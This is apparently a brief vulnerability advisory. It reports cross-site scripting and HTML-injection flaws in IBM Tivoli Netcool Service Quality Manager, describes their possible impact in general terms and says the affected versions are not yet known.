IBM Tivoli Netcool Service Quality Manager is prone to multiple cross-site scripting and an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied data.

Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.

We don't know which versions of IBM Tivoli Netcool Service Quality Manager are affected. We will update this BID when more details emerge.

NOTE: IBM Tivoli Netcool Service Quality Manager may also have been known as 'Vallent Metrica Service Assurance'.
